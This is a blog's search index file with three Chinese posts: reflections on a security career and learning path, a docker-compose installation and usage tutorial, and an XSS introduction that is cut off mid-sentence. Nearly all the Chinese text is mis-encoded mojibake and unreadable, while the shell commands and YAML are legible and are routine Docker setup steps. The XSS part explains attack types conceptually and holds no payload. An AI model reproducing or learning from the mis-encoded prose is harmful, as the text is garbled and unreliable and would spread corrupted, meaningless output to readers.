<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ç½‘ç»œå®‰å…¨è¡Œä¸šä¸ªäººå‘å±•æµ…æ</title>
    <link href="/2021/01/24/2021%E5%B9%B41%E6%9C%8824%E6%97%A5-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E4%B8%AA%E4%BA%BA%E5%8F%91%E5%B1%95%E6%B5%85%E6%9E%90/"/>
    <url>/2021/01/24/2021%E5%B9%B41%E6%9C%8824%E6%97%A5-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E4%B8%AA%E4%BA%BA%E5%8F%91%E5%B1%95%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>2020å¹´9æœˆçš„æ—¶å€™ï¼Œå‡­å€Ÿç€ä¸ªäººå…´è¶£çš„é©±ä½¿ã€‚æˆ‘æ”¾å¼ƒäº†è‡ªå·±å¼€å‘çš„ç»å†ï¼Œå¼€å§‹æ…¢æ…¢çš„è½¬å‘å®‰å…¨æ–¹å‘ã€‚å½“æ—¶æ²¡æœ‰ä»€ä¹ˆçœ‰ç›®ï¼Œå°±åªç›¯ç€CTFæ–¹å‘å¼€å§‹é’»ç ”ï¼Œå¼€å§‹æ…¢æ…¢æ‡‚å¾—äº†ä¸€äº›æ¼æ´çš„åˆ©ç”¨æ–¹å¼ã€‚æœ€è¿‘åœ¨æ€è€ƒè‡ªå·±çš„å®‰å…¨ä¹‹è·¯æ—¶ï¼Œæˆ‘çš„çœ¼å…‰æ˜¯è¿·èŒ«ï¼Œæˆ‘ä¸çŸ¥é“è‡ªå·±è¯¥å­¦ä¹ ä»€ä¹ˆï¼Œåº”è¯¥å¾€å“ªä¸ªæ–¹å‘å»å­¦ä¹ ï¼Œæ‰€ä»¥å°è¯•äº†è‡ªå·±å›ç­”ä»¥ä¸‹çš„é—®é¢˜æ¥å¸®åŠ©è‡ªå·±çœ‹æ¸…è‡ªå·±çš„è·¯çº¿ã€‚</p><p><strong>0x01 ç½‘ç»œå®‰å…¨æœ‰å“ªäº›å·¥ä½œç±»å‹ï¼Ÿæˆ‘æƒ³å»å“ªä¸ªæ–¹å‘ï¼Ÿ</strong></p><ul><li>å®‰å…¨ç ”å‘ï¼šå·¥ä½œä¸»è¦æ˜¯å¼€å‘ç”¨äºå®‰å…¨é˜²å¾¡çš„äº§å“ï¼Œå¼€å‘çš„äº§å“ä¸»è¦ç”¨äºå°†å·²çŸ¥ä¸”å¸¸è§çš„æ¼æ´è¿›è¡Œé˜²å¾¡ã€‚</li><li>äºŒè¿›åˆ¶æ–¹å‘ï¼šå·¥ä½œä¸»è¦åå‘äºè½¯ä»¶ç ´è§£ã€ç—…æ¯’åˆ†æç­‰å·¥ä½œã€‚</li><li>ç½‘ç»œæ¸—é€æ–¹å‘ï¼šå·¥ä½œä¸»è¦åå‘äºç½‘ç»œæ¸—é€æ”»å‡»ã€æ”»å‡»ç½‘ç«™ã€æ”»å‡»ä¸ªäººç”µè„‘ç­‰ã€‚éœ€æ±‚å¹¿å¹¶ä¸”æ–¹å‘å¤šï¼Œé€šå¸¸ä¹Ÿéœ€è¦æ¯”è¾ƒå¹¿çš„çŸ¥è¯†é¢ã€‚<br>å‚è€ƒæ•™ç¨‹ï¼š</li></ul><ol><li>å°ç™½æ€ä¹ˆå…¥é—¨ç½‘ç»œå®‰å…¨ï¼Ÿçœ‹è¿™ç¯‡å°±å¤Ÿå•¦ï¼ï¼š<a href="https://www.cnblogs.com/xuanyuan/p/13624707.html">https://www.cnblogs.com/xuanyuan/p/13624707.html</a></li></ol><p><strong>0x02 çº¢é˜Ÿæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>æ¨¡æ‹ŸçœŸå®ä¸–ç•Œçš„é»‘å®¢æ”»å‡»çš„å›¢é˜Ÿã€‚çœŸå®ä¸–ç•Œçš„é»‘å®¢æ”»å‡»æ˜¯é€šè¿‡ç»¼åˆåˆ©ç”¨å„ç§æ‰‹æ®µæ¥è¿›è¡Œé»‘å®¢æ”»å‡»çš„ä¸€ç§æ–¹å¼ï¼Œå…¶ä¸­åŒ…æ‹¬ç¤¾å·¥ç­‰æ–¹å¼ï¼ˆè¿™ç§æ–¹å¼åˆå«åšAPTï¼‰ã€‚çœŸå®ä¸–ç•Œçš„é»‘å®¢æå…·ç›®çš„æ€§ï¼Œä½†æ˜¯å¹¶ä¸å¸Œæœ›è¢«æ£€æµ‹åˆ°ã€‚</p><p><strong>0x03 çº¢é˜Ÿå’Œæ¸—é€æµ‹è¯•æ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ</strong></p><p>æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿåœ¨æŠ€æœ¯æ–¹å‘éå¸¸ç±»ä¼¼æ¸—é€æµ‹è¯•ï¼Œä½†æ˜¯åœ¨æ€ç»´æ–¹å¼ä¸Šå´å®Œå…¨ä¸åŒã€‚</p><ol><li>æ¸—é€æµ‹è¯•çš„é‡ç‚¹åœ¨äºå°½å¯èƒ½å¤šçš„æ£€æµ‹å‡ºæ¼æ´æ‰€åœ¨ã€‚</li><li>çº¢é˜Ÿçš„å…³é”®ç‚¹åœ¨äºå°½å¯èƒ½è¾¾åˆ°ç›®çš„å¹¶ä¸”éšè—è‡ªå·±çš„ä¿¡æ¯ã€‚</li></ol><p>å‚è€ƒæ•™ç¨‹ï¼š</p><ol><li>è°ˆè°ˆæ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿçš„åŒºåˆ«ï¼š<a href="https://www.secrss.com/articles/12168">https://www.secrss.com/articles/12168</a></li></ol><p><strong>0x04 CTFå’Œå…¶ä»–å®‰å…¨æ–¹å‘çš„å…³ç³»æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>CTFåˆ†ä¸ºä¸¤ç§æ¨¡å¼ã€Œè§£é¢˜æ¨¡å¼ã€å’Œã€ŒAWDæ¨¡å¼ã€ï¼Œè§£é¢˜æ¨¡å¼é€šå¸¸æ˜¯ä¸ºäº†ç»¼åˆåˆ©ç”¨å„ç§ã€ŒWebæ¼æ´ã€å’Œã€Œå®‰å…¨çŸ¥è¯†ã€æ¥è·å–flagä»è€Œèµ¢å¾—åˆ†æ•°ã€‚å¤§éƒ¨åˆ†æ—¶å€™æ˜¯è¿æ°”ã€å®åŠ›ã€ç»†å¿ƒç¨‹åº¦çš„ä¸€ç§è€ƒå¯Ÿï¼Œå¯ä»¥ç”¨æ¥è®­ç»ƒè‡ªå·±ï¼Œè®©è‡ªå·±åœ¨Webæ¼æ´çš„æŒæ¡ä¸Šæ›´ä¸Šä¸€å±‚æ¥¼ã€‚ä½†æ˜¯è¿™æ ·çš„çŸ¥è¯†åªèƒ½åœ¨çº¢é˜Ÿä¸­è¿›è¡Œæ‰“ç‚¹ï¼Œæ‰€è·å¾—çš„çŸ¥è¯†ä½“ç³»å¤ªè¿‡äºå±€é™äº†ã€‚</p><p><strong>0x05 æˆ‘ç°åœ¨å¤„äºå®‰å…¨å±Šçš„å“ªä¸ªå±‚æ¬¡ï¼Ÿ</strong></p><p>ä¸Šæ¬¡gcowå›¢é˜Ÿä¸­ç«¥ç«¥å¸ˆå‚…çš„è¯„ä»·</p><ul><li>bypassæŠ€å·§ 10%</li><li>ç½‘ç»œåŸºç¡€ 0%</li><li>å¸¸è§webæ¼æ´ 30%</li><li>ä»£ç å®¡è®¡ 5%</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/05B07287-4F7B-44EB-82A4-CF44BA78172D.png"></p><p>æˆ‘æ˜¯èœé¸¡ï¼Œå¹²å·´çˆ¹ğŸ‘‹</p><p><strong>0x06 æœ‰å“ªäº›æ¯”è¾ƒå…¨é¢çš„å­¦ä¹ æŠ€èƒ½ç‚¹ï¼Ÿ</strong></p><p>ç½‘ç»œå®‰å…¨æ¶‰åŠçš„å†…å®¹éå¸¸å¹¿ï¼Œå…¶ä¸»è¦çš„å­¦ä¹ è·¯çº¿å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚å¯ä»¥ç®€å•å½’çº³ä¸ºï¼š</p><ul><li>åŸºç¡€çŸ¥è¯†ï¼šWebå‘å±•ç®€å²ã€è®¡ç®—æœºç½‘ç»œã€åŸŸåç³»ç»Ÿã€HTTPæ ‡å‡†ã€ä»£ç å®¡è®¡ã€WAF</li><li>ä¿¡æ¯æ”¶é›†ï¼šåŸŸåä¿¡æ¯ã€ ç«™ç‚¹ä¿¡æ¯ã€ç«¯å£ä¿¡æ¯ã€å…¶å®ƒ</li><li>å†…ç½‘æ¸—é€ï¼šWindowsä¿¡æ¯æ”¶é›†ã€æŒä¹…åŒ–ã€Linuxä¿¡æ¯æ”¶é›†ã€ç—•è¿¹æ¸…ç†ã€å…¶ä»–</li><li>å¸¸è§æ¼æ´ï¼šSQLæ³¨å…¥ã€XSSã€CSRFã€SSRFã€å‘½ä»¤æ³¨å…¥ã€æ–‡ä»¶è¯»å–ã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€XXEã€æ¨¡ç‰ˆæ³¨å…¥ã€Xpathæ³¨å…¥ã€ é€»è¾‘æ¼æ´ ã€ä¸šåŠ¡æ¼æ´ã€é…ç½®å®‰å…¨ã€ä¸­é—´ä»¶ã€Web Cacheæ¬ºéª—æ”»å‡»</li><li>è¯­è¨€ä¸æ¡†æ¶ï¼šPHPã€Pythonã€Javaã€JavaScriptã€Rubyã€C\C++ã€C#</li><li>é˜²å¾¡æŠ€æœ¯ï¼šæ€»ä½“æ€è·¯ã€ å›¢é˜Ÿå»ºè®¾ã€å¨èƒæƒ…æŠ¥ã€é£é™©æ§åˆ¶ã€åŠ å›ºæ£€æŸ¥ã€èœœç½æŠ€æœ¯ã€å…¥ä¾µæ£€æµ‹ã€åº”æ€¥å“åº”ã€æº¯æºåˆ†æ</li><li>å·¥å…·ä¸èµ„æºï¼šå·¥å…·åˆ—è¡¨ã€æ¨èèµ„æºã€çˆ†ç ´å·¥å…·ã€ä¸‹è½½å·¥å…·ã€æµé‡ç›¸å…³ã€å—…æ¢å·¥å…·ã€SQLMapä½¿ç”¨</li><li>å…¶ä»–ï¼šè®¤è¯æ–¹å¼ã€æ‹’ç»æœåŠ¡æ”»å‡»ã€DNSåŠ«æŒã€Docker</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/340EC80F-6F47-491F-9924-894F778CF411.png"></p><p><strong>0x07 æˆ‘åœ¨å“ªäº›æ–¹é¢è¿˜æœ‰ç¼ºé™·ï¼Ÿ</strong></p><p>å¤ªå¤šäº†ï¼ˆ</p><p><strong>0x09 å¦‚ä½•å­¦ä¹ è¿™äº›çŸ¥è¯†ï¼Ÿ</strong></p><p>å‚è€ƒæ•æ·å¼€å‘ï¼Œä¸æ–­è¿­ä»£ï¼šæœ‰ä¸€ä¸ªç²—ç•¥çš„è®¤è¯†-&gt;æœ‰äº†è¿›ä¸€æ­¥çš„è®¤è¯†-&gt;å½»åº•æŒæ¡-&gt;æ¸©æ•…è€ŒçŸ¥æ–°ã€‚ä¸ç”¨çº ç¼ äºæŠŠä¸€é—¨è¯¾ç¨‹å…¨éƒ¨å­¦å®Œå­¦æ‡‚æ‰è¿›å…¥ä¸‹ä¸€é—¨è¯¾ç¨‹ã€‚</p><p>å‚è€ƒæ•™ç¨‹ï¼š</p><ol><li>ç½‘ç»œå®‰å…¨è‡ªå­¦ç¯‡ï¼ˆäºŒåä¸‰ï¼‰| Webå®‰å…¨å­¦ä¹ è·¯çº¿åŠæœ¨é©¬ã€ç—…æ¯’å’Œé˜²å¾¡åˆæ¢ï¼š<a href="https://cloud.tencent.com/developer/article/1620918">https://cloud.tencent.com/developer/article/1620918</a></li></ol><p><strong>0x10 æ¥ä¸‹æ¥æˆ‘åº”è¯¥æ€ä¹ˆåšï¼Ÿ</strong></p><ul><li>åˆ†æå„ç§æ‹›è˜çš„è¦æ±‚ï¼Œç¡®å®šå­¦ä¹ ç›®æ ‡</li><li>åˆ¶å®šå­¦ä¹ è®¡åˆ’</li><li>å¯»æ‰¾å­¦ä¹ èµ„æºè¿›è¡Œå­¦ä¹ </li><li>åŠæ—¶æ€»ç»“å’Œå›é¡¾</li></ul>]]></content>
    
    
    <categories>
      
      <category>ç”Ÿæ´»</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ€è€ƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker-composeä»‹ç»ä»¥åŠç®€å•ä½¿ç”¨</title>
    <link href="/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-docker-compose%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-docker-compose%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="1 å®‰è£…"></a>1 å®‰è£…</h1><h2 id="1-1-docker"><a href="#1-1-docker" class="headerlink" title="1.1 docker"></a>1.1 docker</h2><p>æŒ‰ç…§ä¸‹é¢çš„æ­¥éª¤è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># æ›´æ–°ç°æœ‰çš„åŒ…</span><br>sudo apt update<br><br><span class="hljs-meta"># æ·»åŠ Docker PGPå…¬é’¥</span><br>curl -fsSL https:<span class="hljs-comment">//download.docker.com/linux/debian/gpg | sudo apt-key add -</span><br><br><span class="hljs-meta"># é…ç½®Docker APTåº“</span><br>echo <span class="hljs-string">&#x27;deb [arch=amd64] https://download.docker.com/linux/debian buster stable&#x27;</span> | sudo tee /etc/apt/sources.list.d/docker.list<br><br><span class="hljs-meta"># æ›´æ–°ä¸€ä¸‹APTåˆ—è¡¨</span><br>sudo apt-<span class="hljs-keyword">get</span> update<br><br><span class="hljs-meta"># å®‰è£…Dockerï¼Œåœ¨å®‰è£…å‰å…ˆåˆ é™¤åŸæ¥ç³»ç»Ÿä¸­å¯èƒ½è‡ªå¸¦çš„Dockerï¼š</span><br>sudo apt-<span class="hljs-keyword">get</span> remove docker docker-engine docker.io<br><br><span class="hljs-meta"># å®‰è£…Docker:</span><br>sudo apt-<span class="hljs-keyword">get</span> install docker-ce<br><br><span class="hljs-meta"># çœ‹çœ‹å®‰è£…æˆåŠŸäº†æ²¡:</span><br>sudo docker run hello-world<br><br><span class="hljs-meta"># è®¾ç½®å¯åŠ¨</span><br>sudo systemctl start docker<br>sudo systemctl enable docker<br></code></pre></td></tr></table></figure><h2 id="1-2-docker-compose"><a href="#1-2-docker-compose" class="headerlink" title="1.2 docker-compose"></a>1.2 docker-compose</h2><p>è·å–æ‰§è¡Œæ–‡ä»¶åˆ°æœ¬åœ°ï¼ˆå¯èƒ½éœ€è¦sudoï¼‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -L https://github.com/docker/compose/releases/download/1.25.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="hljs-built_in">local</span>/bin/docker-compose<br></code></pre></td></tr></table></figure><p>ä¸ºå¯æ‰§è¡Œæ–‡ä»¶è®¾ç½®æƒé™</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">chmod +x /usr/<span class="hljs-built_in">local</span>/bin/docker-compose<br></code></pre></td></tr></table></figure><p>ç¡®å®šæ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker-compose version<br></code></pre></td></tr></table></figure><p>æœ€åçš„æ•ˆæœ:<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/15906035-DA64-401D-9C4C-BEE8738BDB68.png"></p><h1 id="2-docker-composeä»‹ç»"><a href="#2-docker-composeä»‹ç»" class="headerlink" title="2 docker-composeä»‹ç»"></a>2 docker-composeä»‹ç»</h1><p>é¦–å…ˆéœ€è¦çŸ¥é“ docker-compose æ˜¯ä¸ºäº†è§£å†³ä»€ä¹ˆåœºæ™¯è€Œå‡ºç°çš„ã€‚</p><p>è¿è¡Œ docker éœ€è¦ä½¿ç”¨é•¿è€Œç¹æ‚çš„å‘½ä»¤ã€‚å¦‚ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker run \<br>  --detach \<br>  --name registry \<br>  --hostname registry \<br>  --volume $(<span class="hljs-built_in">pwd</span>)/app/registry:/var/lib/registry \<br>  --publish 5000:5000 \<br>  --restart unless-stopped \<br>  registry:latest<br></code></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿è¿è¡Œï¼Œå¯ä»¥å°†è¿™ç§docker runå†™æˆshellæ–‡ä»¶ã€‚</p><p>web é•œåƒç¡®æ¯”è¿™æ›´ä¸ºå¤æ‚ï¼Œä¸€ä¸ªç®€å•çš„ docker run å‘½ä»¤ä¸è¶³ä»¥å¼€å¯ä¸€ä¸ª Web æœåŠ¡ï¼Œé€šå¸¸éœ€è¦å¤šä¸ªé•œåƒï¼Œé•œåƒä¹‹é—´è¿˜ä¼šæœ‰ä¸€äº›ä¼˜å…ˆå…³ç³»ã€‚è¿™ç§å…³ç³»çš„ç¼–æ’å°±å«åš docker çš„ç¼–æ’ã€‚</p><p>docker æä¾›ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…· docker-compose æ¥å¸®åŠ©å®Œæˆ docker çš„ç¼–æ’ï¼Œè¦ä½¿ç”¨ docker-compose éœ€è¦ç¼–å†™ä¸€ä¸ª docker-compose.yml æ–‡ä»¶ï¼ˆé…ç½®æ–‡ä»¶ï¼‰ã€‚<br>ä¾‹å¦‚ï¼š</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;3&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">web:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">beginor/geoserver:2.11.1</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">geoserver-web</span><br>    <span class="hljs-attr">hostname:</span> <span class="hljs-string">geoserver-web</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-number">8080</span><span class="hljs-string">:8080</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./web/data_dir:/geoserver/data_dir</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./web/logs:/geoserver/logs</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span><br>    <span class="hljs-attr">links:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">database:database</span><br>  <span class="hljs-attr">database:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">beginor/postgis:9.3</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">postgis</span><br>    <span class="hljs-attr">hostname:</span> <span class="hljs-string">postgis</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-number">5432</span><span class="hljs-string">:5432</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./database/data:/var/lib/postgresql/data</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-attr">POSTGRES_PASSWORD:</span> <span class="hljs-string">1q2w3e4R</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ymlæ–‡ä»¶å®šä¹‰äº†ä¸¤ä¸ªæœåŠ¡webå’Œdatabaseï¼Œä¸€ä¸ªæœåŠ¡åœ¨è¿è¡Œæ—¶å¯¹åº”ä¸€ä¸ªå®¹å™¨çš„å®ä¾‹ï¼Œä¸Šé¢çš„æ–‡ä»¶è¡¨ç¤ºè¦å¯åŠ¨ä¸¤ä¸ªå®ä¾‹ã€‚</p><p>åœ¨éƒ¨ç½²æ—¶ï¼Œé€šå¸¸éœ€è¦å°† docker-compose.yml æ–‡ä»¶æ”¾åˆ°ä¸€ä¸ªç›®å½•ä¸‹ï¼Œè¡¨ç¤ºä¸€ä¸ªåº”ç”¨ï¼Œdocker ä¼šä¸ºè¿™ä¸ªåº”ç”¨åˆ›å»ºç‹¬ç«‹çš„ç½‘ç»œã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>docker-compose up -d</code> æ¥å¯åŠ¨è¿™ä¸ªç¨‹åºã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh">~/Desktop/<span class="hljs-built_in">source</span> Â» docker-compose up -d                                                                                                                       255 â†µ littlechieh6@MacBook-Pro<br>Creating network <span class="hljs-string">&quot;source_app1&quot;</span> with the default driver<br>Building server<br>Step 1/6 : FROM ubuntu:16.04<br>16.04: Pulling from library/ubuntu<br>be8ec4e48d7f: Pull complete<br>33b8b485aff0: Pull complete<br>d887158cc58c: Pull complete<br>05895bb28c18: Pull complete<br>Digest: sha256:3355b6e4ba1b12071ba5fe9742042a2f10b257c908fbdfac81912a16eb463879<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> ubuntu:16.04<br>â€¦â€¦<br></code></pre></td></tr></table></figure><p>è¦åœæ­¢ä¸Šé¢çš„å®¹å™¨ï¼Œåªéœ€è¦è¾“å…¥ <code>docker-compose down</code> å³å¯ã€‚</p><p>ä»ä¸Šé¢çš„å‘½ä»¤å¯ä»¥çœ‹å‡ºï¼Œdocker-compose ä¸ä»…å¯ä»¥æ ¹æ®é…ç½®æ–‡ä»¶ docker-compose.yml è‡ªåŠ¨åˆ›å»ºç½‘ç»œï¼Œå¯åŠ¨å“åº”çš„å®¹å™¨å®ä¾‹ï¼Œä¹Ÿå¯ä»¥æ ¹æ®é…ç½®åˆ é™¤å®¹å™¨å®ä¾‹ã€‚</p><h1 id="3-docker-composeä½¿ç”¨"><a href="#3-docker-composeä½¿ç”¨" class="headerlink" title="3 docker-composeä½¿ç”¨"></a>3 docker-composeä½¿ç”¨</h1><p>å¸¸ç”¨çš„å‘½ä»¤ï¼š<br> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh"> <span class="hljs-comment"># å¯åŠ¨ docker-compose çš„å®ä¾‹</span><br>docker-compose up -d<br><br><span class="hljs-comment"># å…³é—­ docker-compose çš„å®ä¾‹</span><br>docker-compose down<br><br><span class="hljs-comment"># åˆ—å‡ºæœ¬æœºæ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br>docker container ls<br>docker ps<br><br><span class="hljs-comment"># ç”¨æ¥æŸ¥çœ‹ docker å®¹å™¨çš„è¾“å‡ºï¼Œå³å®¹å™¨é‡Œé¢ Shell çš„æ ‡å‡†è¾“å‡ºã€‚</span><br>$ docker container logs [containerID]<br><br><span class="hljs-comment"># è¿›å…¥å®¹å™¨</span><br>$ docker container <span class="hljs-built_in">exec</span> -it [containerID] /bin/bash<br><br></code></pre></td></tr></table></figure></p><h1 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h1><p> å‚è€ƒæ•™ç¨‹ï¼š</p><ol><li>ä½¿ç”¨ docker-compose æ›¿ä»£ docker runï¼š<a href="https://beginor.github.io/2017/06/08/use-compose-instead-of-run.html">https://beginor.github.io/2017/06/08/use-compose-instead-of-run.html</a></li><li>Kali Linux 2020.1 Releaseå®‰è£…Docker-CEï¼š<a href="https://zhuanlan.zhihu.com/p/110675842">https://zhuanlan.zhihu.com/p/110675842</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSSåŸºç¡€åŸºæœ¬æ¦‚å¿µä»¥åŠæ¯”è¾ƒ from ã€ŠWebå®‰å…¨æ”»é˜²ã€‹</title>
    <link href="/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-XSS%E5%9F%BA%E7%A1%80%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E6%AF%94%E8%BE%83-from-%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E3%80%8B/"/>
    <url>/2021/01/22/2021%E5%B9%B41%E6%9C%8822%E6%97%A5-XSS%E5%9F%BA%E7%A1%80%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E6%AF%94%E8%BE%83-from-%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="1-ç®€ä»‹ä¸å¯¹æ¯”"><a href="#1-ç®€ä»‹ä¸å¯¹æ¯”" class="headerlink" title="1 ç®€ä»‹ä¸å¯¹æ¯”"></a>1 ç®€ä»‹ä¸å¯¹æ¯”</h1><p>XSSæ”»å‡»å¯ä»¥åˆ†ä¸ºä¸‰ç§</p><ol><li>åå°„å‹ï¼šä¸€æ¬¡æ€§ã€é€šè¿‡é‚®ä»¶ä¼ æ’­ã€éœ€è¦ç»è¿‡æœåŠ¡å™¨</li><li>Dom å‹ï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ŒDocument Object Modelï¼‰ï¼šä¸€æ¬¡æ€§ã€ä¸éœ€ç»è¿‡æœåŠ¡å™¨ï¼ˆä¸å‘é€æ¶ˆæ¯ï¼‰</li><li>å­˜å‚¨å‹ï¼šæŒä¹…æ€§ã€é€šå¸¸å‡ºç°åœ¨ç•™è¨€æ¿ä¸­ã€é€šå¸¸æ˜¯å¤„äºä¿¡ä»»çš„é“¾æ¥ä¸­ï¼ˆç†Ÿæ‚‰çš„è®ºå›ç½‘ç«™ï¼‰</li></ol><p>åå°„å‹å’Œå­˜å‚¨å‹éƒ½éœ€è¦å‘å¤–éƒ¨å‘é€ä¿¡æ¯ï¼Œç»è¿‡æœåŠ¡å™¨åä¼ å›ï¼Œè€Œ DOM å‹ç”±æœ¬åœ°çš„æµè§ˆå™¨è¿›è¡Œè§£ææ‰§è¡Œã€‚</p><p>åŒºåˆ«åå°„å‹å’Œ DOM å‹æœ€ç®€å•çš„æ£€éªŒæ–¹æ³•å°±æ˜¯ã€ŒBurp æŠ“åŒ…ã€ï¼Œå¦‚æœ Burp æŠ“åˆ°æ•°æ®å°±æ˜¯åå°„å‹ï¼ŒæŠ“ä¸åˆ°æ•°æ®å°±æ˜¯DOMå‹ã€‚ï¼ˆé¢è¯•æ—¶ç«¥ç«¥å¸ˆå‚…æ•™çš„</p><p>DOM å‹å’Œåå°„å‹é€šå¸¸éƒ½æ˜¯æ”»å‡»è€…æ„é€  URLï¼Œå­˜å‚¨å‹åˆ™æ˜¯æ„é€  Payload 